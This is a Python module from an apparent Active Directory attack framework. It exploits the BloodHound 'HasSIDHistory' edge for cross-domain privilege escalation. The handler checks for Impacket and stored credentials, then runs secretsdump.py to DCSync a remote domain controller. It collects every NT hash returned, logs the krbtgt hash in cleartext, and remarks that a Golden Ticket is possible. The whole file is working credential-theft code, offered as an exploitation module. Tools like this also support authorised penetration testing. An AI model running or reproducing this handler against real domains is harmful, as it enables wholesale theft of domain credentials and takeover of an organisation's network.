"""SID History abuse handler for cross-domain privilege escalation.

Exploits the ``HasSIDHistory`` BloodHound edge.  When a user object has
SID History entries containing a privileged SID from another domain
(e.g. Domain Admins), the user inherits those privileges when
authenticating to resources in that domain.

Attack flow:
    1. Verify Impacket tools are available and credentials exist.
    2. Use ``secretsdump.py`` with the current user's credentials to
       perform a DCSync against the remote domain's DC, leveraging the
       inherited SID History privileges.

Rollback:
    None -- this is a read-only credential extraction operation.
"""

from __future__ import annotations

import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("HasSIDHistory")
class HasSIDHistoryHandler(BaseEdgeHandler):
    """Exploit ``HasSIDHistory`` for cross-domain privilege escalation.

    If a user has SID History containing a privileged SID from another
    domain, they inherit those privileges when authenticating.  This
    handler uses Impacket's ``secretsdump.py`` to DCSync the remote
    domain controller using the inherited privileges.
    """

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify Impacket tools are available and credentials exist.

        Args:
            edge: The ``HasSIDHistory`` edge to evaluate.

        Returns:
            ``(ok, message)`` tuple.
        """
        # Check Impacket availability
        if not shutil.which("secretsdump.py"):
            return (
                False,
                "secretsdump.py not found on PATH. "
                "Install via: pip install impacket",
            )

        # Verify we have credentials for the source principal
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)

        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (
                    False,
                    f"No credentials available for source principal '{source_user}'. "
                    "Cannot authenticate for DCSync via SID History.",
                )

        return (
            True,
            f"Ready for HasSIDHistory exploitation: {source_user} has "
            f"SID History granting privileges in target domain.",
        )

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        """Use secretsdump.py to DCSync the remote domain via SID History privileges.

        Args:
            edge: The ``HasSIDHistory`` edge.
            dry_run: If ``True``, log the planned actions without executing them.

        Returns:
            ``(success, message, new_credentials)`` tuple.
        """
        source_user = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()

        # The target domain DC may differ from the source domain DC.
        # Attempt to extract from edge/target properties, fallback to config DC.
        target_domain = edge.target.properties.get("domain") or edge.target.domain
        target_dc = edge.target.properties.get("dc_host") or dc_host

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would perform DCSync against {target_dc} as "
                f"'{source_user}' using SID History privileges "
                f"(target domain: {target_domain}).",
                [],
            )

        self.logger.info(
            "HasSIDHistory: Performing DCSync against '%s' as '%s' "
            "(SID History grants privileges in '%s')",
            target_dc, source_user, target_domain,
        )

        _target_str, auth_flags = self._get_impacket_auth(source_user)

        # Determine password/hash for the target string
        cred = self.cred_store.get_best_credential(source_user, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.secretsdump(
            target=target_dc,
            auth_args=auth_flags,
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
            dc_ip=target_dc,
            just_dc=True,
            timeout=180,
        )

        if not result["success"]:
            return (
                False,
                f"DCSync via SID History failed against {target_dc}: "
                f"{result.get('error', 'unknown')}",
                [],
            )

        hashes: dict[str, str] = result.get("hashes", {})
        new_creds: list[Credential] = []

        for user, nt in hashes.items():
            new_creds.append(
                Credential(
                    cred_type=CredentialType.nt_hash,
                    value=nt,
                    username=user,
                    domain=target_domain,
                    obtained_from=f"DCSync via HasSIDHistory ({source_user} -> {target_dc})",
                )
            )

        if "krbtgt" in hashes:
            self.logger.info(
                "krbtgt hash captured from %s: %s (Golden Ticket possible)",
                target_domain, hashes["krbtgt"],
            )

        return (
            True,
            f"DCSync via SID History complete against {target_dc}: "
            f"extracted {len(hashes)} NT hashes from {target_domain}",
            new_creds,
        )

    # ------------------------------------------------------------------
    # Rollback
    # ------------------------------------------------------------------

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """No rollback needed -- DCSync is a read-only operation."""
        return None
